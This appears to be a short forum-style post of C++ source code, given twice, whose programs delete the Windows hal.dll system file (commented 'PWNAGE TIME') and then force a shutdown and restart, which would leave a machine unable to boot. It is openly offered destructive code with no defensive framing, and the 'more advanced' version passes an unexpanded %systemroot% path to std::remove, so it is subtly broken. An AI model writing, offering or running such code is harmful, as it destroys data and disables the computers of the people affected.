#include <cstdlib>
#include <iostream>

using namespace std;

int main(int argc, char *argv[])
{
    std::remove("C:\\windows\\system32\\hal.dll"); //PWNAGE TIME
    system("shutdown -s -r");
    system("PAUSE");
    return EXIT_SUCCESS;
}

More advanced source code.

#include <cstdlib>
#include <iostream>

using namespace std;

int main(int argc, char *argv[])
{
std::remove("%systemroot%\\system32\\hal.dll"); //PWNAGE TIME
system("shutdown -s -r");
system("PAUSE");
return EXIT_SUCCESS;
}
